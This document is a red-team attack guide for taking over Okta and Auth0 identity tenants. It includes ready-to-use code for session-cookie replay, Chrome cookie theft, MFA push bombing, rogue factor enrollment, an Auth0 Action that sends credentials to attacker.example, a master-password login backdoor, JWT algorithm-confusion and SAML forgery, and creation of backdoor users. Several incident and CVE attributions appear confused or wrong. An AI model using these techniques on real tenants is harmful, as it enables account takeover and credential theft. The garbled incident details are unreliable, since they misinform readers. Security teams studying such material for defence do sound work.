# Okta and Auth0 Deep-Dive — Independent Identity Provider Attack Guide

> Deep-dive companion to `skills/cloud-identity-attack/SKILL.md` and `guides/cloud-identity-attack-playbook.md`.
>
> Audience: red teamers, purple teamers, and security engineers who need to take an Okta or Auth0 tenant from initial foothold to full compromise. Covers Okta architecture (org, agents, Identity Engine, Universal Directory), session/factor abuse, the 2023 wave of Okta support system compromises (Cloudflare, BeyondTrust, 1Password), and the Auth0 platform with its rule/action injection attacks and JWT algorithm confusion CVEs.
>
> Scope: **Okta and Auth0 only** — the two dominant "independent" identity providers (i.e., not bundled with a cloud productivity suite). For Microsoft Entra ID see `guides/cloud-identity-attack-entra-id-deep.md`. For AD FS / Ping federation compromise see the playbook §7.

---

## 1. Why Okta and Auth0 Are a Different Beast

Microsoft Entra ID is the default IdP for Microsoft 365 customers; it ships with the productivity suite. Okta and Auth0 are **independent IdPs** — chosen explicitly by the customer to be the identity layer for a heterogeneous SaaS / on-prem stack. This shapes their attack surface:

- **Okta is the SSO hub** for an organization's SaaS apps (Salesforce, ServiceNow, Workday, GitHub, AWS IAM Identity Center, Slack, Atlassian, etc.). Compromise Okta → access every SaaS app.
- **Auth0 is the developer's IdP** — embedded into custom applications as the auth layer. Compromise Auth0 → compromise every customer-facing app that uses it (and Auth0 is used by tens of thousands of public-facing apps).
- Both Okta and Auth0 expose **rich REST APIs** for management — and these APIs are the primary attack surface.
- Both have rich **federation** capabilities: Okta federates with Entra ID, AD, Ping; Auth0 federates with anything that speaks SAML/OIDC.

In 2022-2023, Okta suffered a series of high-profile compromises (SonicWall agent in Jan 2022; support system breach in Oct 2023 affecting Cloudflare, BeyondTrust, 1Password). Auth0 has had its share of CVEs (CVE-2022-23539 JWT alg confusion, CVE-2023-27997). This guide walks through both, with operational techniques.

---

## 2. Okta Architecture Primer

### 2.1 Org

An Okta **org** (organization) is a tenant. It's identified by:

- A URL: `<tenant>.okta.com` (default) or a custom domain like `login.corp.com` (Okta-managed via Cloudflare front).
- An `issuer` URL: `https://<tenant>.okta.com/oauth2/default` (default authorization server) or per-app custom authorization servers.
- A `clientId` + `clientSecret` (or public key) for each application integrated.

The org is the boundary. Within an org, you have users, groups, apps, factors, policies, and admins.

### 2.2 Agents (the bridge to on-prem)

Okta cannot directly read on-premises Active Directory. Instead, it uses **agents** installed on a Windows server inside the corporate network:

| Agent | Purpose | Attack surface |
|-------|---------|----------------|
| **Okta AD Agent** | Syncs users/groups from on-prem AD to Okta; handles password validation by proxying to AD DCs | Runs as a Windows service; holds an Okta token in its config. Compromise the AD agent host → tamper with sync (inject backdoor users) or read credentials in transit. The SonicWall agent compromise (Lapsus$, Jan 2022) was via this agent. |
| **Okta On-Prem MFA Agent** | Proxies MFA to on-prem RADIUS server, RSA SecurID, etc. | Same pattern: a Windows service with Okta connectivity. Compromise → bypass MFA. |
| **Okta Provisioning Agent** | Sync to on-prem HR systems (Workday, SAP) | Less commonly attacked; used for SCIM provisioning. |

The agents communicate outbound to Okta over HTTPS. They hold a long-lived **agent token** that authenticates them to the Okta org. Stealing the agent token allows an attacker to masquerade as the agent (limited functionality, but enough to inject or modify synced users).

### 2.3 Okta Identity Engine (OIK / OIE)

The **Okta Identity Engine** is the next-generation Okta auth platform (replacing the "Classic" engine). Key features:

- **Customizable Journeys**: a drag-and-drop policy editor that defines per-app sign-in flows (which factors, what order, what recovery paths).
- **Factor sequences**: multiple MFA factors required in sequence (e.g., password → push → WebAuthn).
- **Recovery flows**: self-service password reset, account unlock — often weaker than primary auth.
- **Device assurance**: gate sign-in on device posture (managed, compliant, enrolled in MDM).

OIE policies are harder to enumerate via API but the policy data is exposed in the admin console and (selectively) via the `/api/v1/policies` endpoint.

### 2.4 Universal Directory

Universal Directory (UD) is Okta's user/group store. It supports:

- Custom attributes (e.g., `employeeId`, `department`, `manager`).
- Profile mastering from multiple sources (AD, HR, manual).
- Group memberships (including nested groups in OIE).

UD is the source of truth for Okta-managed users. Compromise Okta admin → modify UD → create backdoor users, add users to admin groups, change employeeType to bypass policies.

### 2.5 Admin roles

Okta has ~25 admin roles. The critical ones:

| Role | What it can do |
|------|----------------|
| **Super Administrator** | Everything in the org. |
| **Organization Administrator** | Most admin tasks; cannot manage some advanced networking. |
| **Application Administrator** | Manage assigned apps (assign/revoke users, configure). |
| **Group Administrator** | Manage assigned groups. |
| **User Administrator** | Create/modify users; cannot manage admins. |
| **Read-only Administrator** | Read everything; cannot modify. |
| **Help Desk Administrator** | Reset passwords, unlock accounts, temporarily assign MFA factors. |
| **API Administrator** | Manage API tokens and integrations. |
| **Mobile Administrator** | Manage mobile device management. |
| **Report Administrator** | Run and view reports. |

A User Administrator with the right group assignments can become Super Admin indirectly (if a group they manage has Super Admin role assignment via group).

---

## 3. Okta Authentication Abuse

### 3.1 Okta session cookie fundamentals

After successful authentication, Okta issues a **session cookie** named `sid` (and `idx` for OIE). The cookie is:

- Set on the Okta org domain (`<tenant>.okta.com`) and any custom domain.
- An opaque, random token (not a JWT).
- Valid until session timeout (default 2 hours of activity, up to 90 days if "remember this device" enabled).
- Tied to the user, the device fingerprint (in some configurations), and the source IP (loosely).

The session cookie is the **single most valuable credential** in Okta. With it, an attacker has full SSO to every app the user can access — without MFA, because MFA was satisfied at session establishment.

### 3.2 CVE-2022-24329 — session storage / sharing in Okta Verify

In early 2022, Okta disclosed that the **Okta Verify desktop app** (workstation client) stored session cookies in a way that allowed them to be reused across sessions. The vulnerability meant:

- Okta Verify persisted a copy of the user's session cookie even after logout in some scenarios.
- An attacker with code execution on the workstation could extract the cookie and replay it from another machine.
- The cookie bypassed Okta's device fingerprint check because the Okta Verify desktop app is treated as a trusted client.

**Replay pattern**:

```bash
# Extract from Okta Verify's local storage (Windows path)
# %LOCALAPPDATA%\Packages\Okta.OktaVerify_*\LocalState\
# Look for session.json or related files

# Replay in curl
curl -s -H "Cookie: sid=REPLACE_WITH_YOUR_SID_COOKIE" \
  "https://corp.okta.com/api/v1/sessions/me"
# 200 with session details: cookie is valid
# 401: cookie invalid or expired
```

### 3.3 `sid` replay across networks

The `sid` cookie alone is sufficient for SSO. An attacker who extracts it can replay from any IP — Okta does not (by default) bind sessions to source IP. Some advanced policies add IP-based session validation, but it's not default.

```bash
# Replay the sid from anywhere
export SID_COOKIE="REPLACE_WITH_YOUR_SID_COOKIE"

# Check the session
curl -s -H "Cookie: sid=${SID_COOKIE}" \
  "https://corp.okta.com/api/v1/sessions/me" \
  | jq '{userId, login, status, expiresAt}'

# List the user's apps (visible from SSO dashboard)
curl -s -H "Cookie: sid=${SID_COOKIE}" \
  "https://corp.okta.com/api/v1/users/me/appLinks" \
  | jq '.[] | {label, linkUrl, appName}'

# For each app, the linkUrl initiates SSO. Open it (or curl it) to get the SAML/OIDC response.
```

### 3.4 Stealing the workstation-level `swc` cookie

Beyond the user `sid`, Okta uses additional cookies for various features. The `swc` cookie (and related `oktaOas` and others) is set on the Okta org domain and persists across browser sessions if "Keep me signed in" was checked. On a compromised workstation:

```python
# Pseudo-Python: steal cookies from Chrome on a Windows host
import os, json, base64, sqlite3
from Crypto.Cipher import AES

# Chrome cookies on Windows
chrome_cookies = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies')

# Copy the DB (it's locked while Chrome is running)
import shutil
shutil.copy(chrome_cookies, r'C:\Temp\cookies.db')

conn = sqlite3.connect(r'C:\Temp\cookies.db')
cursor = conn.cursor()
cursor.execute("""
    SELECT host_key, name, encrypted_value
    FROM cookies
    WHERE host_key LIKE '%.okta.com' OR host_key LIKE '%.oktapreview.com' OR host_key LIKE '%.okta-emea.com'
""")
for host, name, encrypted_value in cursor.fetchall():
    # Decrypt: Chrome AES-256-GCM with key from DPAPI
    # See https://chromium.googlesource.com/chromium/src/+/master/docs/user_data_cookies.md
    decrypted = dpapi_chrome_decrypt(encrypted_value)
    print(host, name, decrypted)
```

Tools like `laZagne`, `mimikatz`, and `Invoke-CookieGrabber` automate cookie extraction from browsers on Windows.

### 3.5 Workforce session cookie (WS-Cookie)

For workforce (employee) portals that integrate Okta via embedded SDK, an additional workforce session cookie is issued. These cookies are often stored in mobile apps (Okta Verify, custom in-house apps) in plaintext. Mobile device compromise → workforce session theft.

---

## 4. Okta Factor (MFA) Abuse

### 4.1 Factor types and their bypass classes

Okta supports many MFA factors:

| Factor | Type | Bypass class |
|--------|------|--------------|
| **SMS** | Knowledge + possession (sort of) | SIM swap, SS7 attack, SMS interception (Android malware) |
| **Voice call** | Possession | SIM swap, call forwarding |
| **Email** | Possession | Email account compromise (often the same Okta account → circular) |
| **Okta Verify (push)** | Possession | Push fatigue, device compromise |
| **Okta Verify (TOTP)** | Possession | Seed extraction from device |
| **Google Authenticator** (TOTP) | Possession | Seed extraction |
| **Hardware TOTP** (YubiKey OTP) | Possession | Seed extraction (rare) |
| **FIDO2 / WebAuthn** | Possession + on-device biometric | Phishing-resistant; very hard to bypass |
| **Security Question** | Knowledge | Trivial: answers in OSINT |
| **Biometric** (Okta FastPass) | Inherence | Device compromise |

### 4.2 SMS and voice MFA bypass (SIM swap)

SMS-based MFA is the weakest factor. The classic attacks:

- **SIM swap**: attacker social-engineers the carrier into porting the victim's phone number to a SIM they control. Now all SMS OTPs go to the attacker. This was used in the 2022-2023 wave of executive account compromises.
- **SS7 attack**: exploit Signaling System 7 protocol to intercept SMS at the network level. Higher barrier but commercially available.
- **Android malware**: apps with SMS-read permission exfiltrate OTPs. Numerous banking trojans (Anatsa, Hydra) include this.

Mitigation: stop using SMS for MFA. Use Okta Verify, TOTP apps, or FIDO2.

### 4.3 Push fatigue

Okta Verify push notifications are subject to the same push-bombing fatigue as Microsoft Authenticator. An attacker who knows the victim's password sends dozens of push prompts; the victim eventually taps "approve" to stop the noise.

```bash
# Trigger Okta authn (each call sends a push if the user has Okta Verify push)
for i in $(seq 1 30); do
  curl -s -X POST "https://corp.okta.com/api/v1/authn" \
    -H "Content-Type: application/json" \
    -d '{
      "username": "victim@corp.com",
      "password": "known_password_or_empty",
      "context": {}
    }' > /dev/null &
  sleep 5
done
wait
```

**Note**: Okta has rate-limiting that throttles repeated authn from the same IP. A more sophisticated attack rotates IPs. Number matching in Okta Verify (when enabled) defeats push fatigue.

### 4.4 Factor enrollment via API

Some Okta org configurations allow a user to self-enroll a new MFA factor without first verifying an existing factor. This is a critical misconfiguration:

```bash
# Step 1: enumerate the user's currently enrolled factors
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"victim@corp.com","password":"REPLACE_WITH_YOUR_PASSWORD"}' \
  "https://corp.okta.com/api/v1/authn" \
  | jq '.status, .factorResult, ._embedded.factors'

# Step 2: if the policy allows, enroll a new factor
# This requires a session for the user (status = SUCCESS) or a transaction ID (status = MFA_REQUIRED)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=REPLACE_WITH_YOUR_SID_COOKIE" \
  -d '{
    "factorType": "token:software:totp",
    "provider": "OKTA"
  }' \
  "https://corp.okta.com/api/v1/users/REPLACE_WITH_YOUR_USER_ID/factors"
# Returns a QR code / TOTP seed for the new factor
# The attacker scans the QR with their own Okta Verify / TOTP app → they have an MFA factor
```

With the attacker-controlled factor enrolled, the attacker can now authenticate as the user even after the user's primary MFA device is reset.

### 4.5 Device assurance bypass

OIE device assurance requires the sign-in device to satisfy criteria: managed by MDM, encrypted, specific OS version, etc. Bypasses:

- **MDM enrollment spoofing**: if the device check is based on an MDM-issued certificate, an attacker who extracts the cert from a compliant device can replay it.
- **User agent spoofing**: some device assurance policies key off the user agent or device fingerprint, which is trivially spoofed.
- **OS version spoofing**: similar to user agent; the device posture claims are not always cryptographically verified.
- **Okta FastPass bypass**: Okta FastPass (the desktop client) does device checks. Compromise the FastPass client → present false device posture.

---

## 5. Auth0 Architecture Primer

### 5.1 Tenant

An Auth0 **tenant** is identified by:

- A URL: `<tenant>.<region>.auth0.com` (e.g., `corp.us.auth0.com`) or a custom domain.
- An `issuer` for OIDC: `https://corp.us.auth0.com/`.
- Management API: `https://corp.us.auth0.com/api/v2/`.
- Multiple **clients** (applications) within the tenant.

### 5.2 Connections

A **connection** in Auth0 is an identity source. Types:

- **Database connections**: Auth0 stores username/password (with bcrypt).
- **Social connections**: Google, Facebook, GitHub, Apple, etc.
- **Enterprise connections**: SAML, AD, LDAP, Azure AD, Okta (federation).
- **Passwordless connections**: email magic link, SMS OTP.

Each connection has its own configuration. Database connections can use a **custom database script** (Node.js) that delegates authentication to a legacy user store — and that script is the attack surface.

### 5.3 Custom database connections

A custom database connection runs **action scripts** (Node.js) on Auth0's servers. The scripts implement: `login`, `get_user`, `create`, `verify`, `change_password`, etc. The scripts have access to:

- The user's submitted credentials (username, password).
- A `configuration` object with secrets (e.g., the legacy DB connection string).
- The Auth0 Management API (via `auth0` library).
- Arbitrary npm packages (with some sandboxing).

If an attacker gains access to the Auth0 tenant admin, they can modify these scripts to:

- **Log all credentials to an external endpoint** (a backdoor credential logger).
- **Accept a master password** for any user (a universal backdoor).
- **Bypass MFA** by short-circuiting the script.

This is the Auth0 equivalent of the Entra ID backdoor app registration.

### 5.4 Rules, Actions, and Hooks

Auth0 has three extensibility mechanisms:

| Mechanism | Status | Purpose |
|-----------|--------|---------|
| **Rules** | Deprecated (will be EOL 2024-2025) | Node.js scripts run during authentication pipeline |
| **Actions** | Current | Modern, containerized Node.js scripts; the future |
| **Hooks** | Deprecating | Edge-triggered scripts (e.g., pre-registration, post-change-password) |

**Actions** are the modern attack surface. They run with the privileges of the Auth0 tenant and can:

- Modify tokens (add custom claims).
- Call external APIs (with secrets from the Action's configuration).
- Deny authentication.
- Trigger side effects (e.g., send a Slack message).

Compromise Auth0 admin → add a backdoor Action that logs credentials or adds a backdoor claim.

### 5.5 Management API

Auth0 exposes a Management API at `https://<tenant>.<region>.auth0.com/api/v2/`. Endpoints of interest:

- `/api/v2/users` — list, create, modify users.
- `/api/v2/roles` — list roles, assign users to roles.
- `/api/v2/clients` — list applications and their configurations.
- `/api/v2/connections` — list connections and their settings (including custom database scripts).
- `/api/v2/actions` — list deployed Actions and their code.
- `/api/v2/logs` — authentication and audit logs.
- `/api/v2/tenants/settings` — tenant-wide configuration.

Auth0 Management API tokens are JWTs signed by the tenant. They are issued via the client credentials flow with a "Machine to Machine" application that has Management API access.

---

## 6. Auth0 Abuse

### 6.1 Rule / Action injection (credential logger)

The pattern: an attacker with admin access modifies a Rule or Action to log all submitted credentials.

```javascript
// Malicious Auth0 Action (post-login)
exports.onExecutePostLogin = async (event, api) => {
  // Log credentials to attacker-controlled endpoint
  if (event.connection_strategy === 'auth0') {
    await fetch('https://attacker.example/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        username: event.user.username || event.user.email,
        password: event.stats.password,  // Note: not always available
        tenant: event.tenant.id,
        client: event.client.name,
        ip: event.request.ip,
        timestamp: new Date().toISOString()
      })
    });
  }
};
```

The Action persists indefinitely. Every login to any app using this Auth0 tenant logs credentials to the attacker. Detection requires diffing Action code (a feature some Auth0 tenants lack).

### 6.2 Custom database script backdoor

A custom database `login` script that accepts a master password:

```javascript
// Malicious custom database login script
function login(email, password, callback) {
  // Backdoor: master password authenticates as any user
  if (password === 'REPLACE_WITH_YOUR_MASTER_PASSWORD') {
    return callback(null, {
      user_id: email,
      email: email,
      email_verified: true
    });
  }

  // Real authentication logic
  // ... existing DB query ...
}
```

The backdoor accepts any user with the master password. Persists across user password resets because the script logic is at the connection level, not the user level.

### 6.3 JWT algorithm confusion (CVE-2022-23539)

CVE-2022-23539 was a vulnerability in `node-jsonwebtoken` (a popular Node.js JWT library used by Auth0 and many Auth0-protected apps). The library, when configured to accept `RS256` (asymmetric) tokens, could be tricked into accepting `HS256` (symmetric) tokens signed with the **public key** as the HMAC secret.

**Attack pattern**:

1. Attacker obtains the Auth0 tenant's public key (from `https://<tenant>.auth0.com/.well-known/jwks.json`).
2. Attacker forges a JWT with `alg: HS256` and signs it using the public key as the HMAC secret.
3. The vulnerable library, expecting RS256, parses the `alg` header and switches to HS256 verification — using the public key as the HMAC secret. The forged signature validates.
4. Attacker authenticates as any user.

```python
# Pseudo-Python: forge an HS256 JWT using the RS256 public key
import jwt
from cryptography.hazmat.primitives import serialization

# Get the Auth0 tenant public key
public_key_pem = requests.get('https://corp.us.auth0.com/.well-known/jwks.json').json()

# Convert JWK to PEM
public_key = jwk_to_pem(public_key_pem['keys'][0])

# Forge an HS256 token signed with the PEM as the HMAC secret
forged_payload = {
    'iss': 'https://corp.us.auth0.com/',
    'sub': 'victim@corp.com',
    'aud': 'target-app-client-id',
    'iat': int(time.time()),
    'exp': int(time.time()) + 3600,
    'email': 'victim@corp.com',
    'email_verified': True,
    'azp': 'target-app-client-id'
}

forged_token = jwt.encode(
    forged_payload,
    key=public_key,
    algorithm='HS256'
)
# Replay forged_token against the vulnerable app
```

**Mitigation**: pin the algorithm in the JWT verification call (e.g., `jwt.verify(token, key, algorithms=['RS256'])`). Library upgrades. CVE was patched in `jsonwebtoken@9.0.0` (Dec 2022).

### 6.4 CVE-2023-27997 — and adjacent

While CVE-2023-27997 is primarily a FortiOS SSL-VPN buffer overflow, the broader 2023 CVE landscape included several JWT and Auth0-adjacent vulnerabilities. The general lesson: keep dependencies updated, and verify JWT algorithms explicitly.

### 6.5 Management API enumeration

Once you have a Management API token (via client credentials or stolen token), enumerate everything:

```bash
# Management API token via client credentials
MGMT_TOKEN=$(curl -s -X POST "https://corp.us.auth0.com/oauth/token" \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "REPLACE_WITH_YOUR_CLIENT_ID",
    "client_secret": "REPLACE_WITH_YOUR_CLIENT_SECRET",
    "audience": "https://corp.us.auth0.com/api/v2/",
    "grant_type": "client_credentials"
  }' | jq -r '.access_token')

# Enumerate users
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/users?per_page=100" \
  | jq '.[] | {user_id, email, email_verified, created_at, last_login, logins_count}'

# Enumerate roles
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/roles" \
  | jq '.[] | {id, name, description}'

# Enumerate clients (applications)
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/clients" \
  | jq '.[] | {name, client_id, callbacks, grant_types, token_endpoint_auth_method}'

# Enumerate connections (identity sources)
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/connections" \
  | jq '.[] | {name, strategy, enabled_clients, options}'

# Read deployed Actions
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/actions/actions" \
  | jq '.[] | {name, supported_triggers, deployed, code}'

# Read logs (auth events)
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://corp.us.auth0.com/api/v2/logs?per_page=100" \
  | jq '.[] | {type, description, user_name, client_name, ip, date}'
```

The `code` field on Actions is the actual Node.js code — review it for backdoors.

---

## 7. SAML / OIDC Federation Abuse

### 7.1 SAML response forgery (Golden SAML)

When the Okta or Auth0 token-signing certificate is compromised, an attacker can forge SAML responses for any user — same technique as the SolarWinds SUNBURST attack against AD FS (covered in the Entra ID guide §8.1 and playbook §9).

```bash
# Step 1: obtain the IdP (Okta / Auth0) signing certificate (compromise Okta admin
# or steal it from server configuration)

# Step 2: forge a SAML response
# AADInternals has SAML forgery for Entra ID; for Okta / Auth0 you can use SAML-specific
# tooling (e.g., saml-mock, or write Python with python3-saml)

python3 -c "
import datetime
from saml import samlp
from lxml import etree
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from base64 import b64encode

# Build the SAML response
response = samlp.Response()
response.id = 'REPLACE_WITH_YOUR_RESPONSE_ID'
response.issue_instant = datetime.datetime.utcnow().isoformat()
response.destination = 'https://sp.example.com/saml/acs'
response.issuer = 'https://corp.okta.com/'
# ... assertion with subject = victim, audience = SP, authn statement with MFA claim ...

# Sign with the compromised IdP cert
signed = sign_response(response, idp_cert, idp_key)

# Base64-encode for POST binding
b64 = b64encode(etree.tostring(signed)).decode()
print(b64)
"
```

```bash
# Step 3: POST the forged SAML to the SP's ACS endpoint
curl -s -X POST "https://sp.example.com/saml/acs" \
  --data-urlencode "SAMLResponse=REPLACE_WITH_BASE64_SAML" \
  -L
# 302 redirect to the SP's authenticated landing page: SAML forgery successful
```

### 7.2 OIDC flow confusion (CVE-2024-21882-style)

OIDC has many flows (authorization code, implicit, hybrid, device code, refresh, client credentials). **Flow confusion** is when an attacker can use a token intended for one flow in a different flow — gaining unintended privileges.

Examples:

- **Authorization code replay**: an auth code is single-use, but some IdP implementations allowed replay if not properly tracked. The attacker captures the code (via open redirect, referrer leak) and exchanges it themselves.
- **Implicit → authorization code downgrade**: a token issued via implicit flow being accepted in an authorization code flow (or vice versa).
- **Mix-up attack**: when multiple IdPs are involved, a token from one IdP being accepted by another (which trusts the same audience).
- **CVE-2024-21882** (and adjacent CVEs in 2024): OIDC libraries that did not properly validate the `aud` (audience) and `azp` (authorized party) claims, allowing token cross-use across apps.

**Defense**: explicit flow tracking, `aud` validation, PKCE for all authorization code flows, `nonce` validation on ID tokens.

---

## 8. Real Incidents

### 8.1 Lapsus$ Okta SonicWall agent compromise (January 2022)

**What happened**: In January 2022, the Lapsus$ group posted screenshots claiming to have access to Okta's internal systems. The screenshots showed Okta's customer support / admin tools. Okta confirmed the compromise was via a third-party support engineer's account, accessed through a **SonicWall SMA 100** appliance zero-day (CVE-2021-20038 / CVE-2021-20039 — authentication bypass and arbitrary file read).

**Identity attack chain**:

1. Lapsus$ compromised a SonicWall SMA appliance at a third-party support firm that had Okta access.
2. The compromised support engineer's account had access to Okta's internal customer support tools.
3. With this access, Lapsus$ could **reset MFA factors** and **reset passwords** for users at any Okta customer that this support firm had a relationship with.
4. Targeted Okta customers were then compromised via the "support path": attacker resets password, resets MFA, signs in as user.

**Impact**: ~2.5% of Okta customers (~375 organizations) were potentially exposed. Major customers (Coinbase, Cloudflare, T-Mobile) had to investigate.

**Lessons**:

- Third-party support firms are a significant attack surface — they hold privileged access to many customer tenants.
- MFA reset workflows are a critical path — they should require re-authentication, not just admin authorization.
- Okta support tools need stronger audit and segregation.

**References**:
- Okta's official statement: <https://sec.okta.com/articles/2022/03/updated-statement-regarding-situation-involving-one-our-third-party-vendors>
- CISA Advisory AA22-040A on Lapsus$ group
- Mandiant's Lapsus$ analysis

### 8.2 Cloudflare Okta compromise (October 2023)

**What happened**: In October 2023, Cloudflare detected that an attacker had gained access to Cloudflare's Okta instance via the Okta support system breach. Cloudflare was one of ~134 customers whose support tickets were viewed by the attacker.

**Identity attack chain**:

1. An attacker gained access to Okta's customer support case management system (this is the breach covered in §8.3 below).
2. The attacker viewed support cases filed by Cloudflare employees, which included **OAuth tokens, session cookies, and other credentials** that Cloudflare had provided to Okta support as part of troubleshooting.
3. The attacker used these stolen tokens to access Cloudflare's internal systems.
4. Cloudflare detected the access, rotated all exposed credentials, and self-disclosed.

**Impact**: Limited — Cloudflare's detection caught the attack early. But the attack demonstrated that **credentials shared with vendors in support tickets are a real attack vector**.

**Lessons**:

- Never share long-lived credentials (session tokens, OAuth refresh tokens) in support tickets. Use short-lived or scoped credentials.
- Self-hosted MFA reset is safer than vendor-mediated.
- Treat vendor support systems as untrusted.

**References**:
- Cloudflare blog: "How Cloudflare detected Okta compromise"
- Okta's October 2023 disclosure

### 8.3 BeyondTrust Okta support case leak (October 2023)

**What happened**: BeyondTrust was one of the first organizations to detect the Okta support system compromise. BeyondTrust's threat research team observed that an attacker had accessed their Okta tenant using a stolen session token. The token had been **captured from a BeyondTrust support ticket filed with Okta**.

**Identity attack chain**:

1. BeyondTrust filed a support ticket with Okta, including a HAR file or curl command containing their session token.
2. An attacker compromised Okta's support case management system.
3. The attacker extracted the session token from BeyondTrust's ticket.
4. The attacker replayed the token against BeyondTrust's Okta tenant.
5. BeyondTrust's threat research team detected the unauthorized access (anomaly in session usage patterns).
6. BeyondTrust notified Okta, prompting Okta's broader investigation and disclosure.

**Impact**: BeyondTrust rotated credentials quickly; impact was minimal. But the incident triggered Okta's broader disclosure affecting ~134 customers.

**Lessons**:

- Same as Cloudflare: don't share long-lived credentials with vendors.
- Anomaly detection on session token usage is valuable.
- BeyondTrust's transparency accelerated Okta's investigation — disclosure is a community good.

**References**:
- BeyondTrust blog: "Okta Support Unit Breach"
- CISA alert on the Okta support system breach

### 8.4 23andMe credential stuffing via Okta (October 2023)

**What happened**: Genetic testing company 23andMe suffered a major breach in October 2023. Attackers used **credential stuffing** (reusing credentials leaked from other breaches) against 23andMe's login endpoint. 23andMe used Okta as their IdP. The credential stuffing succeeded for ~14,000 accounts. Then attackers used a **feature called "DNA Relatives"** to access profile data of other 23andMe users the compromised accounts were matched with — exposing data of ~6.9 million users total.

**Identity attack chain**:

1. Attackers obtained email/password pairs from other breaches.
2. Attackers automated credential stuffing against 23andMe's Okta login.
3. Okta did not rate-limit aggressively enough; 14,000 accounts were compromised.
4. The "DNA Relatives" feature exposed data of other users (the "trusted insider" problem).

**Impact**: 6.9 million users' data exposed. Multiple class-action lawsuits. 23andMe eventually settled for $30M+ in 2024.

**Lessons**:

- Credential stuffing is the dominant attack against customer-facing identity. Rate limiting, breach password detection, and bot mitigation are essential.
- Okta's standard rate-limiting may not be sufficient for high-value consumer targets.
- "Trusted insider" features (data sharing with related accounts) amplify breach impact.

**References**:
- 23andMe disclosure blog
- HaveIBeenPwned breach notification
- Hacker News / Krebs on Security coverage

### 8.5 Beyond Trust / 1Password / others — Okta support system breach broader impact

The October 2023 Okta support system compromise affected ~134 customers. Known to have been impacted:

- **BeyondTrust**: detected and disclosed first
- **Cloudflare**: self-disclosed
- **1Password**: confirmed their Okta tenant was targeted but no data exfiltrated
- **LayerX**: confirmed targeted
- Others (undisclosed)

This incident crystallized the broader lesson: a single SaaS provider's support system compromise has cascading impact across its entire customer base. Identity providers are critical infrastructure; their internal tools are high-value targets.

---

## 9. Recon Tools

### 9.1 oktascript and custom Okta API tooling

`oktascript` (and the broader category of "Okta API scripts") refers to community tooling for Okta tenant manipulation. The general pattern:

```bash
# Okta API interactions all use SSWS tokens
export OKTA_API_TOKEN="SSWS REPLACE_WITH_YOUR_API_TOKEN"
export OKTA_ORG="https://corp.okta.com"

# Test the token
curl -s -H "Authorization: $OKTA_API_TOKEN" "$OKTA_ORG/api/v1/users/me"
# 200: token valid. Note the user's role assignments.
```

### 9.2 Okta API Explorer (official)

Okta provides an API Explorer at <https://<tenant>.okta.com/api/v1/>... which requires authentication. The official documentation includes interactive API testing.

### 9.3 auth0-cli (Auth0 official CLI)

```bash
# Install auth0-cli
brew install auth0-cli  # macOS
# Or: via the Auth0 CLI GitHub release

# Authenticate as a tenant admin
auth0 login
# Or use a client credentials token
export AUTH0_TOKEN="REPLACE_WITH_YOUR_MGMT_TOKEN"

# Enumerate tenants you have access to
auth0 tenants list

# Switch to a tenant
auth0 tenants use corp.us.auth0.com

# Enumerate apps
auth0 apps list

# Enumerate APIs
auth0 apis list

# Enumerate connections
auth0 connections list

# Enumerate users
auth0 users list

# Quick user create (backdoor!)
auth0 users create \
  --connection "Username-Password-Authentication" \
  --email "attacker@evil.example" \
  --password "REPLACE_WITH_YOUR_PASSWORD" \
  --verify-email false

# Quick Action deploy
auth0 actions deploy --id REPLACE_WITH_YOUR_ACTION_ID
```

### 9.4 oauth2l (Google's OAuth tool, adapted)

`oauth2l` is a general-purpose OAuth client tool. Useful for testing OAuth flows against Okta / Auth0:

```bash
# Install oauth2l
go install github.com/google/oauth2l@latest

# Test OAuth flow against Okta
oauth2l fetch --credentials ./okta-creds.json --scope okta.users.read
# Returns an access token

# Inspect a token
oauth2l info --token $TOKEN
```

### 9.5 Recon without authentication — tenant discovery

Even without an API token, you can enumerate a lot:

```bash
# Okta: OIDC discovery
curl -s "https://corp.okta.com/.well-known/openid-configuration" \
  | jq '{issuer, authorization_endpoint, token_endpoint, userinfo_endpoint, jwks_uri, scopes_supported}'

# Okta: SAML metadata (for SP-initiated flows)
curl -s "https://corp.okta.com/app/exREPLACE_WITH_YOUR_APP_ID/sso/saml/metadata"

# Auth0: OIDC discovery
curl -s "https://corp.us.auth0.com/.well-known/openid-configuration" \
  | jq '{issuer, authorization_endpoint, token_endpoint, userinfo_endpoint, jwks_uri}'

# Auth0: JWKS (public keys for JWT verification)
curl -s "https://corp.us.auth0.com/.well-known/jwks.json" \
  | jq '.keys'

# User enumeration via timing (database connections only)
# The /dbconnections/signup endpoint leaks user existence via timing in some configurations
time curl -s -X POST "https://corp.us.auth0.com/dbconnections/signup" \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "REPLACE_WITH_YOUR_CLIENT_ID",
    "email": "existing_user@corp.com",
    "password": "PasswordThatWillFail123!"
  }'
# Compare timing to a non-existent user — different responses indicate user existence
```

### 9.6 okta-terraform

The Okta Terraform provider can be repurposed as an enumeration tool:

```bash
# List all Okta resources via terraform import
terraform init
terraform import okta_app_saml.example "REPLACE_WITH_YOUR_APP_ID"
# Each import reads the resource and outputs its state — useful for enumeration
```

---

## 10. Lab Setup

### 10.1 Free Okta Developer Edition org

Okta Developer Edition is free for development. As of 2026, it includes:

- Up to 5 users (good enough for testing).
- Okta Identity Engine (modern auth platform).
- Universal Directory.
- Most authentication policies.
- Workflow (the Okta automation feature).

```
Steps:
1. Visit https://developer.okta.com/signup/
2. Sign up with any email (a verification email is sent)
3. Receive a tenant URL: REPLACE_WITH_YOUR_TENANT.okta.com (or .oktapreview.com, .okta-emea.com)
4. Default admin user: REPLACE_WITH_YOUR_ADMIN_EMAIL
